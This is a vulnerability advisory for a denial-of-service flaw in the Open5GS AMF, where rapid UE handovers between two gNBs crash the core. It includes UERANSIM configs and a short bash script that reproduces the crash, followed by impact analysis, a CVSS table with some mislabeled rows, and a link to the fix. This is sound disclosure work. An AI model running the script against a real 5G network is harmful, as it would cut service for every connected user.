@@ -1,0 +1,202 @@
+###########################################################################
+      Open5GS AMF Denial of Service via GMM State Handling in Handover
+###########################################################################
+
+Released Date: 2025-03-11
+Last Modified: 2025-03-11
+Company Info: Open5GS
+Version Info: Open5GS <= v2.7.2
+
+--[ Table of contents
+00 - Description
+01 - Vulnerability Details
+    01.1 - Steps to Reproduce
+02 - Vulnerability Impact
+    02.1 Impact on 5G Core Network Availability
+    02.2 Attack Complexity and Feasibility
+    02.3 Potential Real-World Impact Scenarios
+    02.4 CVSS Score Estimation
+    02.5 Summary of Impact
+03 - Credit
+04 - Proof of concept
+05 - Solution
+06 - Contact information
+
+
+--[ 00 - Description
+
+The purpose of this article is to detail the research I have recently
+conducted regarding a Denial of Service (DoS) vulnerability in Open5GS,
+an open-source 5G core network implementation. An issue was discovered
+in Open5GS v2.7.2. When a UE switches between  two gNBs and sends a
+handover request at a specific time, it may cause  an exception in the
+AMF's internal state machine, leading to an AMF  crash and resulting in
+a Denial of Service (DoS). This vulnerability can be triggered by a single
+attacker-controlled UE, causing the AMF to crash, preventing other UEs
+from registering with the AMF, and impacting the high availability of the
+core network.
+
+--[ 01 - Vulnerability Details
+We suspect that the crash was caused by an unknown state in the state machine within the
+**gmm_state_authentication()** function, specifically involving the process where the AMF
+sends a Npcf_AMPolicyControl creation request to the PCF.
+
+More details can be obtained from this link:https://github.com/open5gs/open5gs/issues/3671
+
+--[ 01.1 - Steps to reproduce
+We use one UE and two gNBs to simulate a scenario where the UE switches between the gNBs.
+The Open5GS core network is built from source using the official tutorial, and two gNBs
+are started with UERANSIM. The configuration uses the default settings, with only the
+IP addresses modified, as follows:
+
+open5gs-gnb.yaml:
+nci: '0x000000010'  # NR Cell Identity (36-bit)
+idLength: 32        # NR gNB ID length in bits [22...32]
+tac: 1              # Tracking Area Code
+linkIp: 127.0.0.1   # gNB's local IP address for Radio Link Simulation (Usually same with local IP)
+ngapIp: 127.0.0.1   # gNB's local IP address for N2 Interface (Usually same with local IP)
+gtpIp: 127.0.0.1    # gNB's local IP address for N3 Interface (Usually same with local IP)
+
+open5gs-gnb1.yaml:
+nci: '0x000000011'  # NR Cell Identity (36-bit)
+idLength: 32        # NR gNB ID length in bits [22...32]
+tac: 1              # Tracking Area Code
+linkIp: 127.0.0.2   # gNB's local IP address for Radio Link Simulation (Usually same with local IP)
+ngapIp: 127.0.0.2   # gNB's local IP address for N2 Interface (Usually same with local IP)
+gtpIp: 127.0.0.2    # gNB's local IP address for N3 Interface (Usually same with local IP)
+
+
+Since the UE needs to switch between two gNBs, two separate configurations are prepared, namely
+open5gs-ue0.yaml and open5gs-ue1.yaml. In these configurations, only the gnbSearchList parameter
+is modified, as follows:
+
+open5gs-ue0.yaml
+# List of gNB IP addresses for Radio Link Simulation
+gnbSearchList:
+  - 127.0.0.1
+
+open5gs-ue1.yaml
+# List of gNB IP addresses for Radio Link Simulation
+gnbSearchList:
+  - 127.0.0.2
+
+
+Next, run the script to simulate the UE continuously switching between the two gNBs. The AMF
+will receive a large number of handover requests. After approximately 5-10 minutes, the AMF will crash.
+#!/bin/bash
+
+UE_COUNT=10
+CONFIG_FILE="../config/open5gs-ue0.yaml"
+CONFIG_FILE1="../config/open5gs-ue1.yaml"
+
+PID1=0
+PID2=0
+
+for ((i=1; i<=UE_COUNT; i++)); do
+    sudo ./nr-ue -c "$CONFIG_FILE" &
+    PID1=$!
+    sleep 1
+
+    if [[ $PID2 -ne 0 ]]; then
+        kill -9 $PID2
+        PID2=0
+    fi
+
+    sudo ./nr-ue -c "$CONFIG_FILE1" &
+    PID2=$!
+    sleep 1
+
+    if [[ $PID1 -ne 0 ]]; then
+        kill -9 $PID1
+        PID1=0
+    fi
+done
+
+
+--[ 02 - Vulnerability Impact
+
+--[ 02.1 Impact on 5G Core Network Availability
+The AMF (Access and Mobility Management Function) is a critical component of the **5G core network**, responsible
+for **user authentication, mobility management, and session handling**. When the AMF crashes:
+- **All currently connected UEs lose access** to the 5G network.
+- **New UEs cannot register**, as the AMF is responsible for processing NAS messages.
+- **All active PDU sessions become invalid**, leading to **loss of connectivity** for ongoing data transmissions.
+- **The entire 5G core network is rendered inoperable** until the AMF process is restarted manually.
+
+This means that **even a single attacker-controlled UE** can **disable the entire network** for all users.
+
+--[ 02.2 Attack Complexity and Feasibility
+
+This attack is **low complexity**, as it does not require:
+✔ **Any modifications to UE firmware or NAS message crafting.**
+✔ **Exploiting any authentication bypasses.**
+✔ **Specialized knowledge of Open5GS internals.**
+
+Instead, it can be performed using **legitimate UE behavior** with an open-source **UERANSIM simulator**, making
+it easy to execute by anyone with basic 5G simulation knowledge.
+
+Key exploitation factors:
+- **Requires only a standard UE and gNB setup** (e.g., UERANSIM + Open5GS).
+- **No authentication or privileged access required.**
+- **Repeatable attack** – The AMF will **continue to crash** every time the sequence is re-executed.
+- **Can be automated** – A simple script (as shown in the previous section) can continuously disrupt the network.
+
+Given these factors, the vulnerability presents a **serious risk** to **5G testbeds, research environments, and
+potentially real-world deployments**.
+
+--[ 02.3 Potential Real-World Impact Scenarios
+🚨 Scenario: Impact on Commercial Deployments of Open5GS
+Open5GS is not only widely used in academic research but also serves as the foundation for commercial 5G core
+network solutions. Companies such as NewPlane leverage Open5GS to provide commercial 5G services. If this
+vulnerability is exploited in a commercial deployment, the impact could include:
+
+Service disruptions affecting enterprise customers and end users.
+Operational downtime, requiring network operators to restart the AMF manually.
+Increased maintenance costs due to repeated failures and necessary fixes.
+This highlights the potential risks for businesses relying on Open5GS for private 5G solutions, network trials,
+or commercial services.
+
+--[ 02.4 CVSS Score Estimation
+The severity of this vulnerability has been assessed using the CVSS 4.0 scoring system, which evaluates multiple factors such as exploitability, privileges required, user interaction, and impact on system security.
+
+Metric Value Description
+Attack Vector (AV) Network (N) The vulnerability can be exploited remotely over a network without requiring physical access.
+Attack Complexity (AC) Low (L) The attack does not require advanced skills, specialized conditions, or complex techniques.
+Attack Requirements (AT) None (N) No additional requirements (e.g., specific configurations) are needed to exploit this issue.
+Privileges Required (PR) None (N) The attacker does not need any authentication or prior access to the system.
+User Interaction (UI) None (N) The attack does not require any user interaction to be successful.
+Confidentiality Impact (VC, VI, VA) None (N) The vulnerability does not lead to the exposure of sensitive data.
+Integrity Impact (SC, SI, SA) None (N) There is no impact on data integrity or system correctness.
+Availability Impact (VA, SA) High (H) Exploiting this issue can cause a full denial of service by crashing the AMF, making the 5G core network unavailable.
+CVSS 4.0 Score: 7.5 (High)
+CVSS Vector:
+CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:H
+
+--[ 02.5 Summary of Impact
+🔴 **Any attacker with basic access to a 5G UE can trigger an AMF crash.**
+🔴 **No authentication required, making this vulnerability easy to exploit.**
+🔴 **Complete loss of network service until AMF is restarted.**
+
+🚨 **Given the ease of exploitation and severity of impact, this vulnerability poses a critical risk to 5G core network reliability.** 🚨
+
+
+--[ 03 - Credit
+
+Wei Guo, Yuanhao Li, Hao Zheng, Qiang Fu, Jiajia Liu
+Northwestern Polytechnical University
+
+--[ 04 - Proof of concept
+
+We strive to do our part to contribute to the security community.
+The Open5gs for the issues outlined in this article can be found online.
+
+--[ 05 - Solution
+
+The developers of Open5GS have been informed of these issues and have fixed them in the main branch.
+https://github.com/open5gs/open5gs/commit/2e68706f1eea029d5172ccad946e78b352c031d0
+
+
+--[ 06 - Contact information
+
+Mail
+guoweifk@163.com
